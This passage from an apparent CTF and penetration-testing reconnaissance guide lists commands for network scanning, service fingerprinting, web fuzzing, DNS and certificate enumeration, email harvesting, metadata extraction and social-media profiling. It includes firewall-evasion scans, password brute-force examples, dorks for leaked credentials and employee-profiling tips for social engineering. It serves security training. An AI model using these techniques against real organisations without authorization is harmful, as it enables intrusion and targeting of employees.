# Custom OS detection with specific ports
nmap -O -p 22,80,445 <target>

# Combine with service detection
nmap -sV -O <target>
```

**xprobe2 for ICMP Fingerprinting**

```bash
xprobe2 <target>
xprobe2 -v <target>  # Verbose output
xprobe2 -p tcp:80:open <target>  # Specify known open port
```

xprobe2 uses ICMP protocol analysis as an alternative when TCP-based fingerprinting is blocked.

### Passive Fingerprinting

**p0f - Passive Traffic Analysis**

```bash
# Listen on interface
p0f -i eth0

# Read from pcap file
p0f -r capture.pcap

# Monitor specific host
p0f -i eth0 'host 192.168.1.100'
```

p0f analyzes packet characteristics without sending probes, identifying OS from:

- TCP SYN packet structures
- MTU values
- Window sizes
- TCP timestamp behavior

**TTL Analysis Method**

Different operating systems use default TTL values:

- Linux/Unix: 64
- Windows: 128
- Cisco/Network Devices: 255

```bash
# Check TTL in ping response
ping -c 1 <target>

# Analyze with hping3
hping3 -S -p 80 -c 1 <target>
```

[Inference] If TTL=63 arrives at your host, original TTL was likely 64 (one hop away), suggesting Linux/Unix.

## Banner Grabbing

Banner grabbing extracts service identification strings that reveal software versions and potential vulnerabilities.

### Manual TCP Connection Methods

**Netcat Banner Grabbing**

```bash
# Basic connection
nc -v <target> <port>

# HTTP banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc <target> 80

# SMTP banner
nc -v <target> 25

# FTP banner
nc -v <target> 21

# Timeout control
nc -v -w 3 <target> <port>
```

**Telnet Method**

```bash
telnet <target> <port>
telnet <target> 80
# Then type: HEAD / HTTP/1.1<enter>Host: target<enter><enter>
```

**OpenSSL for Encrypted Services**

```bash
# HTTPS banner
openssl s_client -connect <target>:443
echo -e "HEAD / HTTP/1.0\r\n\r\n" | openssl s_client -quiet -connect <target>:443

# SMTPS
openssl s_client -connect <target>:465

# Inspect certificate details
openssl s_client -connect <target>:443 -showcerts
```

### Automated Banner Grabbing

**Nmap Service Detection**

```bash
# Basic version detection
nmap -sV <target>

# Aggressive service detection
nmap -sV --version-intensity 9 <target>

# Light probing (faster)
nmap -sV --version-intensity 0 <target>

# Specific ports with version detection
nmap -sV -p 22,80,443,3306 <target>

# All TCP ports with version info
nmap -sV -p- <target>
```

The `--version-intensity` ranges from 0 (light) to 9 (try all probes). Default is 7.

**dmitry - Information Gathering Tool**

```bash
dmitry -p <target>  # Port scan
dmitry -i <target>  # WHOIS lookup
dmitry -b <target>  # Banner grabbing
dmitry -pib <target>  # Combined
```

**amap - Application Mapper**

```bash
# Identify services on specific ports
amap -b <target> 80

# Scan port range
amap -b <target> 1-1000

# Read from nmap output
amap -i nmap_output.gnmap
```

amap sends trigger packets and analyzes responses to identify services even on non-standard ports.

### Protocol-Specific Techniques

**HTTP/HTTPS Headers**

```bash
# curl for detailed headers
curl -I <target>
curl -v <target>

# wget alternative
wget --server-response --spider <target>

# Custom headers to bypass filtering
curl -H "User-Agent: Mozilla/5.0" -I <target>
```

**SMB Banner Information**

```bash
# smbclient
smbclient -L //<target> -N

# enum4linux
enum4linux -a <target>

# nmap SMB scripts
nmap -p 445 --script smb-os-discovery <target>
```

**Database Banners**

```bash
# MySQL
mysql -h <target> -u root

# PostgreSQL
psql -h <target> -U postgres

# MongoDB
mongo <target>:27017
```

## Network Mapping

Network mapping identifies live hosts, network topology, and routing paths.

### Host Discovery

**Nmap Ping Sweeps**

```bash
# ICMP echo (requires root)
nmap -sn <network>/24

# TCP SYN to port 443
nmap -sn -PS443 <network>/24

# TCP ACK (bypasses some firewalls)
nmap -sn -PA80,443 <network>/24

# UDP discovery
nmap -sn -PU53,161 <network>/24

# Disable DNS resolution for speed
nmap -sn -n <network>/24

# ARP scan (local network only)
nmap -sn -PR <network>/24
```

The `-sn` flag (ping scan) skips port scanning after host discovery.

**fping - Fast Parallel Ping**

```bash
# Scan subnet
fping -a -g 192.168.1.0/24 2>/dev/null

# Read targets from file
fping -a -f targets.txt

# Retry count and timeout
fping -c 1 -t 100 -a -g <network>/24
```

**hping3 - Custom Packet Crafting**

```bash
# TCP SYN scan for discovery
hping3 -S -p 80 -c 1 <target>

# Scan entire subnet
for i in {1..254}; do hping3 -S -p 80 -c 1 192.168.1.$i; done

# Specific flags for firewall evasion
hping3 -A -p 80 <target>
```

### Port Scanning Techniques

**TCP Connect Scan**

```bash
# Full connection (no root required)
nmap -sT <target>
```

Completes three-way handshake. Logged by target systems.

**TCP SYN Scan (Stealth)**

```bash
# Half-open scan (requires root)
nmap -sS <target>

# Specific port ranges
nmap -sS -p 1-65535 <target>
nmap -sS -p- <target>  # Same as above

# Common ports
nmap -sS --top-ports 1000 <target>
```

Sends SYN, receives SYN-ACK, sends RST. Less likely to be logged than full connection.

**UDP Scanning**

```bash
# UDP scan (slow, requires root)
nmap -sU <target>

# Common UDP ports
nmap -sU --top-ports 100 <target>

# Specific UDP services
nmap -sU -p 53,161,500 <target>

# Combined TCP/UDP
nmap -sS -sU -p T:80,443,U:53,161 <target>
```

UDP scanning is slower because lack of response often indicates open|filtered state.

**Aggressive Timing and Performance**

```bash
# Timing templates (0=paranoid, 5=insane)
nmap -T4 <target>

# Parallel scanning
nmap --min-parallelism 100 <target>

# No DNS resolution
nmap -n <target>

# Fast scan (100 most common ports)
nmap -F <target>
```

**Firewall Evasion Techniques**

```bash
# Fragment packets
nmap -f <target>

# Custom MTU
nmap --mtu 24 <target>

# Decoy scanning
nmap -D RND:10 <target>
nmap -D decoy1,decoy2,ME,decoy3 <target>

# Spoof source port
nmap --source-port 53 <target>

# Idle/Zombie scan
nmap -sI <zombie_host> <target>
```

### Masscan - High-Speed Scanner

```bash
# Fast full port scan
masscan -p1-65535 <target> --rate=10000

# Specific ports across network
masscan -p80,443,8080 192.168.1.0/24 --rate=1000

# Output formats
masscan -p80 <network>/24 -oG output.txt
masscan -p80 <network>/24 -oX output.xml

# Banner grabbing (limited)
masscan -p80,443 <target> --banners --rate=1000
```

Masscan can scan the entire Internet in under 6 minutes at theoretical maximum speed. Use rate limiting to avoid network issues.

### Route Mapping

**traceroute - Path Discovery**

```bash
# ICMP traceroute
traceroute <target>

# TCP traceroute (specific port)
traceroute -T -p 80 <target>

# UDP traceroute
traceroute -U <target>

# Maximum hops
traceroute -m 20 <target>
```

**tcptraceroute - TCP-specific Tracing**

```bash
tcptraceroute <target>
tcptraceroute <target> 443
tcptraceroute -f 5 <target>  # Start at hop 5
```

**Paris-traceroute - Load Balancer Detection**

```bash
paris-traceroute <target>
```

Paris-traceroute maintains flow identifiers to detect load-balanced paths.

### Network Visualization

**zenmap - Nmap GUI**

```bash
zenmap
```

Provides topology mapping and visual network graphs from nmap results.

**netdiscover - ARP-based Discovery**

```bash
# Passive mode (sniff ARP)
netdiscover -p

# Active scan on range
netdiscover -r 192.168.1.0/24

# Specific interface
netdiscover -i eth0 -r 192.168.1.0/24
```

## Vulnerability Scanning

Vulnerability scanning correlates service versions with known exploits and misconfigurations.

### Nmap Scripting Engine (NSE)

**Script Categories**

```bash
# Default safe scripts
nmap -sC <target>
nmap --script=default <target>

# Vulnerability detection scripts
nmap --script=vuln <target>

# Specific script
nmap --script=http-sql-injection <target>

# Multiple scripts
nmap --script=http-enum,http-headers <target>

# All scripts in category
nmap --script="http-*" <target>

# Script arguments
nmap --script=http-form-brute --script-args http-form-brute.path=/login <target>
```

**Common NSE Scripts for CTFs**

```bash
# SMB vulnerability scanning
nmap --script=smb-vuln-* -p445 <target>

# HTTP enumeration
nmap --script=http-enum -p80 <target>

# SSL/TLS analysis
nmap --script=ssl-cert,ssl-enum-ciphers -p443 <target>

# FTP enumeration
nmap --script=ftp-anon,ftp-bounce -p21 <target>

# SSH algorithms
nmap --script=ssh2-enum-algos -p22 <target>

# DNS enumeration
nmap --script=dns-brute <target>
```

**Script Information**

```bash
# List all scripts
ls /usr/share/nmap/scripts/

# Search for scripts
nmap --script-help="*vuln*"

# Update script database
nmap --script-updatedb
```

### OpenVAS - Comprehensive Vulnerability Scanner

**Setup and Operation**

```bash
# Install (if not present)
apt install openvas

# Initial setup
gvm-setup

# Start services
gvm-start

# Access web interface at https://127.0.0.1:9392
# Default credentials from setup output
```

OpenVAS provides extensive vulnerability database with detailed findings and remediation guidance.

### Nikto - Web Server Scanner

```bash
# Basic scan
nikto -h <target>

# Specific port
nikto -h <target> -p 80,443,8080

# SSL/HTTPS
nikto -h https://<target>

# Tuning options (reduce noise)
nikto -h <target> -Tuning 1  # Interesting files
nikto -h <target> -Tuning 2  # Misconfiguration
nikto -h <target> -Tuning x  # Reverse tuning (exclude)

# Output formats
nikto -h <target> -o report.html -Format htm
nikto -h <target> -o report.txt

# Update database
nikto -update
```

Tuning codes: 1=Interesting, 2=Misconfiguration, 3=Information, 4=Injection, 5=Remote File Retrieval, 6=DOS, 7=Remote Command Execution, 8=SQL Injection, 9=File Upload, 0=Command Execution, a=Authentication, b=Software Identification, c=Remote Source Inclusion, x=Reverse Tuning

### WPScan - WordPress Vulnerability Scanner

```bash
# Basic enumeration
wpscan --url <target>

# Enumerate users
wpscan --url <target> --enumerate u

# Enumerate vulnerable plugins
wpscan --url <target> --enumerate vp

# Enumerate themes
wpscan --url <target> --enumerate vt

# All enumeration
wpscan --url <target> --enumerate u,vp,vt,tt,cb,dbe

# API token for vulnerability data
wpscan --url <target> --api-token <token>

# Password brute force
wpscan --url <target> -U admin -P /usr/share/wordlists/rockyou.txt
```

Get free API token from wpvulndb.com for vulnerability correlation.

### Specialized Scanners

**searchsploit - Local Exploit Database**

```bash
# Search by software name
searchsploit apache 2.4

# Search by version
searchsploit "linux kernel 4.4"

# Exact match
searchsploit -e "ProFTPd 1.3.5"

# Copy exploit to current directory
searchsploit -m exploits/linux/remote/12345.py

# Web search path
searchsploit -w apache

# Update database
searchsploit -u
```

searchsploit queries the local Exploit-DB archive included in Kali.

**enum4linux - SMB/SAMBA Enumeration**

```bash
# Full enumeration
enum4linux -a <target>

# User enumeration
enum4linux -U <target>

# Share enumeration
enum4linux -S <target>

# Password policy
enum4linux -P <target>

# OS information
enum4linux -o <target>
```

**sslscan - SSL/TLS Configuration Analysis**

```bash
# Scan SSL/TLS
sslscan <target>:443

# Show certificate details
sslscan --show-certificate <target>:443

# Test specific protocols
sslscan --tls12 <target>:443
```

**testssl.sh - Comprehensive TLS Testing**

```bash
# Full scan
testssl.sh <target>

# Specific tests
testssl.sh --heartbleed <target>
testssl.sh --ccs-injection <target>
testssl.sh --protocols <target>

# Output formats
testssl.sh --jsonfile report.json <target>
```

### Automated Web Scanners

**dirb - Web Content Scanner**

```bash
# Default wordlist
dirb http://<target>

# Custom wordlist
dirb http://<target> /usr/share/wordlists/dirb/common.txt

# Authentication
dirb http://<target> -u username:password

# Extensions
dirb http://<target> -X .php,.txt,.html

# Ignore specific responses
dirb http://<target> -N 404
```

**gobuster - Fast Directory Brute Forcing**

```bash
# Directory brute force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Extensions
gobuster dir -u http://<target> -w wordlist.txt -x php,txt,html

# DNS subdomain brute force
gobuster dns -d <domain> -w wordlist.txt

# Status codes to include
gobuster dir -u http://<target> -w wordlist.txt -b 404,403

# Threads for speed
gobuster dir -u http://<target> -w wordlist.txt -t 50
```

**ffuf - Fast Web Fuzzer**

```bash
# Directory fuzzing
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Extension fuzzing
ffuf -u http://<target>/indexFUZZ -w wordlist.txt

# Subdomain fuzzing
ffuf -u http://FUZZ.target.com -w subdomains.txt

# POST parameter fuzzing
ffuf -u http://<target>/login -X POST -d "username=admin&password=FUZZ" -w passwords.txt

# Filter by size
ffuf -u http://<target>/FUZZ -w wordlist.txt -fs 1234

# Filter by HTTP code
ffuf -u http://<target>/FUZZ -w wordlist.txt -fc 404
```

### Vulnerability Correlation Strategy

1. **Service Version Identification**: Use nmap -sV to identify exact versions
2. **searchsploit Lookup**: Cross-reference versions with exploit database
3. **CVE Research**: Search for CVE identifiers related to discovered versions
4. **Exploit Verification**: Validate exploit applicability before execution
5. **NSE Vulnerability Scripts**: Run targeted vuln scripts against identified services

**Example Workflow**:

```bash
# Identify services
nmap -sV -p- <target> -oN nmap_versions.txt

# Extract versions and search exploits
grep -E "open.*" nmap_versions.txt | awk '{print $3, $4, $5}' | while read service; do searchsploit "$service"; done

# Targeted NSE scan
nmap --script=vuln -p <discovered_ports> <target>

# Specific service enumeration
nikto -h http://<target> -p <web_port>
```

---

**Key Reconnaissance Principles for CTF Success**:

1. **Comprehensive Before Deep**: Broad enumeration reveals attack surface before deep exploitation
2. **Version Precision**: Exact version numbers are critical for exploit matching
3. **Layered Scanning**: Combine multiple toolsâ€”each reveals different information
4. **Output Preservation**: Save all scan results for correlation and later reference
5. **Passive Where Possible**: Reduce detection risk with passive techniques when available

---

## Web Application Reconnaissance

### Passive Reconnaissance

**DNS Enumeration**

```bash
# Basic DNS lookups
host target.com
dig target.com ANY
dig target.com +short

# Zone transfer attempts
dig axfr @ns1.target.com target.com

# Reverse DNS lookup
dig -x 192.168.1.1

# DNS brute forcing with dnsrecon
dnsrecon -d target.com -t std
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt

# Subdomain enumeration with sublist3r
sublist3r -d target.com -b -t 100

# Advanced subdomain enumeration with amass
amass enum -d target.com
amass enum -d target.com -o output.txt
amass enum -passive -d target.com  # Passive only
```

**WHOIS Information**

```bash
# Basic WHOIS query
whois target.com

# Registrar details, nameservers, creation dates
whois -h whois.verisign-grs.com target.com

# Historical WHOIS data requires external services
# ViewDNS.info, WhoisRequest, DomainTools
```

**Search Engine Reconnaissance (Google Dorking)**

```
# Common Google dorks for web apps
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com inurl:login
site:target.com intitle:"index of"
site:target.com ext:sql | ext:db | ext:conf
site:target.com inurl:wp-content | inurl:wp-includes

# GitHub reconnaissance
site:github.com "target.com"
site:github.com "company_name" password
site:github.com "company_name" api_key

# Pastebin leaks
site:pastebin.com "target.com"
```

**Web Archive Analysis**

```bash
# Wayback Machine CLI (waybackurls)
waybackurls target.com > urls.txt
waybackurls target.com | grep -E "\.js$" > js_files.txt

# Historical snapshots reveal removed admin panels, 
# old configurations, commented code, development artifacts
```

### Active Reconnaissance

**Technology Stack Identification**

```bash
# Whatweb - web technology fingerprinting
whatweb target.com
whatweb -v target.com
whatweb -a 3 target.com  # Aggressive mode

# Wappalyzer (browser extension or CLI)
wappalyzer target.com

# Manual header inspection
curl -I https://target.com
curl -v https://target.com 2>&1 | grep -i "server\|x-powered"

# Nikto scan (noisy, leaves logs)
nikto -h https://target.com
nikto -h https://target.com -Tuning x  # Reverse proxy detection
```

**Directory and File Discovery**

```bash
# Gobuster - fast directory brute forcing
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html,js
gobuster dir -u https://target.com -w wordlist.txt -k -t 50  # -k ignores certs, -t threads

# Dirsearch - recursive scanning
dirsearch -u https://target.com -e php,html,js -x 403,404
dirsearch -u https://target.com -w /usr/share/wordlists/dirb/common.txt -r -R 3  # -r recursive, -R depth

# Ffuf - fast web fuzzer
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u https://target.com/FUZZ
ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302,401
ffuf -w params.txt -u https://target.com/api?FUZZ=test -mc all -fc 404

# Feroxbuster - recursive content discovery
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
feroxbuster -u https://target.com -x php,js,txt --depth 3 --threads 50
```

**Parameter and Endpoint Discovery**

```bash
# Arjun - HTTP parameter discovery
arjun -u https://target.com/endpoint
arjun -u https://target.com/api -m GET -oT output.txt

# ParamSpider - mining parameters from Wayback Machine
python3 paramspider.py --domain target.com --output params.txt

# Link extraction from JavaScript
# Extract URLs from JS files
cat js_files.txt | while read url; do 
  curl -s "$url" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"
done

# LinkFinder - endpoint discovery in JS
python3 linkfinder.py -i https://target.com/app.js -o cli

# JS parsing with subjs
cat urls.txt | subjs | tee js_endpoints.txt
```

**API Reconnaissance**

```bash
# Identify API endpoints
gobuster dir -u https://target.com/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Test API versions
curl https://target.com/api/v1/users
curl https://target.com/api/v2/users

# Swagger/OpenAPI documentation
# Check: /api-docs, /swagger-ui, /v2/swagger.json, /openapi.json

# GraphQL introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

**Screenshot and Visual Reconnaissance**

```bash
# EyeWitness - web screenshot tool
eyewitness --web -f urls.txt -d screenshots --no-prompt

# Aquatone - takes screenshots of domains
cat subdomains.txt | aquatone -out aquatone_report

# Useful for large attack surfaces to quickly identify
# interesting targets like admin panels, login pages, etc.
```

**CVE and Vulnerability Correlation**

```bash
# After identifying versions (e.g., Apache 2.4.49)
searchsploit apache 2.4.49
searchsploit -w apache 2.4.49  # Online resources

# CVE databases
# cvedetails.com, nvd.nist.gov, exploit-db.com

# Nuclei - vulnerability scanner with templates
nuclei -u https://target.com
nuclei -l urls.txt -t /root/nuclei-templates/cves/
nuclei -u https://target.com -tags cve,oast -severity critical,high
```

## SSL/TLS Certificate Analysis

SSL/TLS certificates contain Subject Alternative Names (SANs), organization details, and related domains that reveal infrastructure.

**Certificate Transparency Logs**

```bash
# crt.sh - CT log search
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Online tools:
# - crt.sh, censys.io, Entrust CT Search

# Automated subdomain discovery from certificates
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subdomains_from_certs.txt
```

**Manual Certificate Inspection**

```bash
# OpenSSL certificate examination
openssl s_client -connect target.com:443 -showcerts

# Extract certificate details
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text

# Check SAN entries
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text | grep "Subject Alternative Name" -A2

# Certificate chain analysis
openssl s_client -connect target.com:443 -showcerts </dev/null 2>/dev/null | openssl x509 -noout -issuer -subject

# Cipher suite enumeration
nmap --script ssl-enum-ciphers -p 443 target.com

# SSLyze - comprehensive SSL/TLS scanner
sslyze --regular target.com:443
sslyze --heartbleed --robot target.com:443
```

**Vulnerability Detection in SSL/TLS**

```bash
# testssl.sh - comprehensive SSL/TLS testing
./testssl.sh https://target.com
./testssl.sh --vulnerable https://target.com  # Only vulnerabilities

# Check for specific vulnerabilities:
# - Heartbleed (CVE-2014-0160)
nmap -p 443 --script ssl-heartbleed target.com

# - POODLE (SSLv3)
nmap -p 443 --script ssl-poodle target.com

# - BEAST, CRIME, BREACH
./testssl.sh --protocols --ciphers https://target.com

# - Certificate validation issues
./testssl.sh --warnings https://target.com
```

**Certificate Metadata for OSINT**

- Issuer organization reveals hosting/infrastructure providers
- Subject Alternative Names expose related domains and subdomains
- Certificate validity periods may indicate refresh cycles
- Serial numbers can be tracked across infrastructure

## Email Harvesting

Collecting email addresses reveals employee names, organizational structure, and potential phishing/social engineering targets. [Inference: This data is also useful for username enumeration and password spraying]

**Passive Email Collection**

```bash
# theHarvester - comprehensive OSINT tool
theharvester -d target.com -b all -l 500
theharvester -d target.com -b google,bing,linkedin -l 200
theharvester -d target.com -b dnsdumpster,crtsh

# Hunter.io API (requires key)
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=YOUR_KEY"

# Manual search engine queries
site:target.com intext:"@target.com"
site:linkedin.com "at target.com"

# GitHub email mining
site:github.com "@target.com"
```

**Active Email Verification**

```bash
# SMTP user enumeration (VRFY, EXPN, RCPT TO)
smtp-user-enum -M VRFY -U users.txt -t mail.target.com
smtp-user-enum -M EXPN -u admin -t mail.target.com
smtp-user-enum -M RCPT -U users.txt -t mail.target.com -D target.com

# Manual SMTP enumeration
nc mail.target.com 25
EHLO attacker.com
VRFY admin@target.com
VRFY root@target.com

# Email format patterns
# Common formats: first.last@, flast@, firstl@, f.last@
# Generate with username-anarchy
/opt/username-anarchy/username-anarchy John Doe > usernames.txt
```

**Email Pattern Analysis**

```bash
# After collecting samples, identify pattern
# Then generate employee lists from LinkedIn/company directory

# Example: firstname.lastname@target.com pattern
# With names: John Smith, Jane Doe
echo "john.smith@target.com" >> emails.txt
echo "jane.doe@target.com" >> emails.txt

# Validation with email-validator or similar
cat emails.txt | while read email; do
  host -t MX $(echo $email | cut -d'@' -f2) && echo "$email: Valid domain"
done
```

**Data Breach Search**

```bash
# dehashed.com, haveibeenpwned.com (manual check)
# Leak databases often contain:
# - Email:password combinations
# - Security questions
# - Historical passwords for pattern analysis

# H8mail - data breach checking
h8mail -t target@target.com

# Breachdirectory API
curl "https://breachdirectory.com/api?term=target@target.com"
```

## Metadata Extraction

File metadata contains EXIF data, author names, software versions, GPS coordinates, internal paths, and system information.

**Image Metadata (EXIF)**

```bash
# ExifTool - comprehensive metadata reader
exiftool document.pdf
exiftool image.jpg
exiftool -a -G1 -s file.docx  # All tags with group names

# Extract all metadata recursively
exiftool -r -csv /path/to/files/ > metadata.csv

# Specific EXIF data extraction
exiftool -GPS* image.jpg  # GPS coordinates
exiftool -Author -Creator document.pdf
exiftool -Software -ModifyDate file.docx

# GPS coordinate conversion
exiftool image.jpg | grep GPS

# Metadata removal (sanitization)
exiftool -all= original.jpg -o cleaned.jpg
mat2 --inplace document.pdf  # Metadata Anonymization Toolkit
```

**Document Metadata**

```bash
# FOCA (Fingerprinting Organizations with Collected Archives)
# Windows tool - identifies metadata, network info, users from documents

# Alternative: metagoofil (Kali Linux)
metagoofil -d target.com -t pdf,doc,xls,ppt -l 100 -o output -f results.html
metagoofil -d target.com -t pdf -l 50 -n 25 -w

# Manual document analysis
exiftool -Author -Creator -Company -LastModifiedBy document.docx
pdfinfo document.pdf  # PDF-specific info
```

**Metadata Intelligence Gathering** Extract the following from metadata:

- **Usernames**: Author, Creator, LastModifiedBy fields reveal employee names
- **Software versions**: Creation tools (e.g., Microsoft Office 2016) may indicate corporate standards
- **Internal paths**: Document paths like `C:\Users\john.smith\Documents\` reveal naming conventions
- **Email addresses**: Properties may contain creator emails
- **Timestamps**: Creation and modification dates indicate document lifecycle
- **Network information**: [Unverified claim, but theoretically possible] Some documents may contain server paths or internal URLs

**Metadata Aggregation**

```bash
# Extract authors from multiple PDFs
exiftool -Author *.pdf | grep Author | sort -u

# Build username list from metadata
exiftool -r -Author -Creator /path/to/docs/ | grep -E "Author|Creator" | awk '{print $3}' | sort -u > usernames.txt

# Software version fingerprinting
exiftool -r -Software /path/to/docs/ | grep Software | sort | uniq -c
```

## Social Media Intelligence (SOCMINT)

Social media platforms leak organizational structure, employee details, technologies used, physical locations, and social engineering vectors.

**Platform-Specific Reconnaissance**

**LinkedIn Intelligence**

```bash
# theHarvester with LinkedIn module
theharvester -d target.com -b linkedin -l 500

# Manual LinkedIn OSINT:
# - Employee enumeration: site:linkedin.com "Company Name"
# - Technology stack: Job postings reveal tech requirements
# - Organizational structure: Titles and relationships
# - Recent hires: Potential targets with weaker security awareness

# linkedin2username - generate username lists
python3 linkedin2username.py -c "Company Name" -n 10

# PhantomBuster, Dux-Soup (browser automation tools for scraping)
# [Unverified]: Effectiveness depends on LinkedIn's anti-scraping measures
```

**Twitter/X Intelligence**

```bash
# Social-Analyzer - SOCMINT tool
python3 social-analyzer.py --username target_user --metadata

# Twint - Twitter scraping (no API required)
twint -u target_company --since 2023-01-01
twint -u target_company -s "password|credential|leak"
twint -u target_company --followers

# Search operators
# from:target_company "our new"
# from:target_company "announcement"
# from:target_company (password OR leak)
```

**GitHub Intelligence**

```bash
# Sensitive data in repositories
# TruffleHog - find secrets in Git repos
trufflehog git https://github.com/target/repo
trufflehog github --org target-org

# Gitrob - find sensitive files
gitrob analyze target-org

# Gitleaks - detect hardcoded secrets
gitleaks detect --source /path/to/repo
gitleaks detect --repo-url https://github.com/target/repo

# Manual searches
site:github.com "target.com" password
site:github.com "target.com" api_key
site:github.com "target.com" "-----BEGIN RSA PRIVATE KEY-----"
site:github.com "target_company" AWS_ACCESS_KEY
```

**General SOCMINT Techniques**

```bash
# Sherlock - username enumeration across platforms
sherlock target_username
sherlock target_username --timeout 5 --print-found

# Holehe - email to account finder
holehe target@target.com

# Maigret - extensive username OSINT
maigret target_username

# Social-Mapper - facial recognition across platforms
python3 social_mapper.py -f path/to/faces -m linkedin -t "Company Name"
```

**Employee Profiling Objectives**

- **Identify decision-makers**: C-level, IT administrators, developers
- **Map organizational structure**: Reporting relationships, team compositions
- **Gather personal details**: Hobbies, interests for social engineering
- **Technology footprints**: Languages, frameworks, tools mentioned in profiles
- **Email patterns**: Validate harvested email formats
- **Physical locations**: Office locations, remote work indicators
- **Insider threats**: Disgruntled employee posts, job changes

**Automated OSINT Frameworks**

```bash
# Recon-ng - modular OSINT framework
recon-ng
[recon-ng][default] > marketplace search
[recon-ng][default] > marketplace install all
[recon-ng][default] > modules load recon/domains-hosts/bing_domain_web
[recon-ng][default] > options set SOURCE target.com
[recon-ng][default] > run

# Maltego - visual OSINT (commercial, has community edition)
# Transforms for domain, email, social media correlation

# SpiderFoot - automated OSINT collection
spiderfoot -s target.com -o json
```

## Reconnaissance Workflow Integration

**Comprehensive Recon Pipeline**

1. **Passive DNS/WHOIS** â†’ Identify infrastructure, nameservers, IP ranges
2. **Certificate Transparency** â†’ Discover subdomains from SANs
3. **Web Technology Fingerprinting** â†’ Identify frameworks, versions, attack surfaces
4. **Directory/Endpoint Discovery** â†’ Map application structure
5. **Email Harvesting** â†’ Build user lists for authentication attacks
6. **Metadata Analysis** â†’ Extract usernames, internal info
7. **Social Media Intelligence** â†’ Profile employees, discover technologies
8. **Vulnerability Correlation** â†’ Map discovered versions to known CVEs

**Automation Scripts**

```bash
#!/bin/bash
# Basic recon automation example
DOMAIN=$1

echo "[*] Starting reconnaissance for $DOMAIN"

# Subdomain enumeration
sublist3r -d $DOMAIN -o subdomains.txt
amass enum -passive -d $DOMAIN >> subdomains.txt

# Certificate transparency
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" | jq -r '.[].name_value' | sort -u >> subdomains.txt

# Active probing
cat subdomains.txt | httprobe -c 50 > live_hosts.txt

# Technology fingerprinting
cat live_hosts.txt | while read url; do
  whatweb -a 3 "$url" >> tech_stack.txt
done

# Screenshot
cat live_hosts.txt | aquatone -out aquatone_results

# Email harvesting
theharvester -d $DOMAIN -b all -l 500 > emails.txt

echo "[*] Reconnaissance complete. Review output files."
```

**Key Tools Summary**

- **DNS**: `dnsrecon`, `sublist3r`, `amass`, `dig`
- **Web**: `gobuster`, `ffuf`, `nikto`, `whatweb`, `waybackurls`
- **SSL/TLS**: `openssl`, `testssl.sh`, `sslyze`, `crt.sh`
- **Email**: `theharvester`, `hunter.io`, `smtp-user-enum`, `h8mail`
- **Metadata**: `exiftool`, `metagoofil`, `mat2`
- **SOCMINT**: `sherlock`, `linkedin2username`, `twint`, `social-analyzer`
- **Git**: `trufflehog`, `gitleaks`, `gitrob`
- **Frameworks**: `recon-ng`, `spiderfoot`, `maltego`

## Important Operational Notes

**Legal and Ethical Considerations**

- **Passive reconnaissance** (OSINT, public data) is generally legal
- **Active reconnaissance** (port scanning, directory brute forcing) requires authorization
- **Respect robots.txt** and rate limits to avoid disruption
- **CTF environments**: Confirm scope before aggressive scanning
- **Real targets**: Always have written permission

**Anti-Detection Measures**

- Use **proxychains** with SOCKS proxies or Tor for anonymity
- Implement **rate limiting** (`-t` flag, delays between requests)
- Rotate **User-Agent strings** to avoid fingerprinting
- **Distributed scanning** from multiple IPs prevents blocking
- **Time-based evasion**: Spread scans over hours/days

**Data Organization**

```bash
# Structured recon output directory
mkdir -p recon/{subdomains,endpoints,emails,metadata,screenshots,vulns}

# Tag and timestamp findings
echo "[$(date)] Found subdomain: api.target.com" >> recon/subdomains/log.txt

# Maintain evidence chain for reporting
# Screenshots, command outputs, timestamps critical for CTF write-ups
```

---

**Related Critical Topics**: Once reconnaissance is complete, transition to vulnerability scanning, service enumeration (e.g., SMB, FTP, SSH), and authentication attacks based on harvested credentials and usernames.

---

# Network Scanning & Enumeration

Network scanning and enumeration form the critical reconnaissance phase where you map the attack surface, identify live hosts, discover running services, and gather intelligence about target systems. This phase directly feeds into vulnerability identification and exploitation.

## Host Discovery

Host discovery identifies live systems on a network before deeper scanning. Multiple techniques exist because different network configurations, firewalls, and host-based protections may block certain probe types.

### Nmap Host Discovery Techniques

**ICMP Echo Requests (Ping Sweep)**

```bash
nmap -sn 192.168.1.0/24
nmap -sn -PE 10.0.0.0/8
```

The `-sn` flag performs host discovery only without port scanning. `-PE` explicitly uses ICMP echo requests. Many firewalls block ICMP, making this technique unreliable in hardened environments.

**TCP SYN Ping**

```bash
nmap -sn -PS22,80,443,3389 192.168.1.0/24
nmap -sn -PS1-65535 192.168.1.0/24
```

`-PS` sends TCP SYN packets to specified ports. If the port is open, the target responds with SYN-ACK. If closed, it responds with RST. Both responses indicate a live host. Default ports are 80 and 443 if none specified.

**TCP ACK Ping**

```bash
nmap -sn -PA80,443 192.168.1.0/24
```

`-PA` sends TCP ACK packets. Stateless firewalls may allow ACK packets through while blocking SYN packets, making this effective when SYN pings fail.

**UDP Ping**

```bash
nmap -sn -PU53,161,500 192.168.1.0/24
```

`-PU` sends UDP packets to specified ports. Closed UDP ports return ICMP port unreachable messages, indicating a live host. DNS (53), SNMP (161), and IKE (500) are common targets.

**ARP Ping (Local Network Only)**

```bash
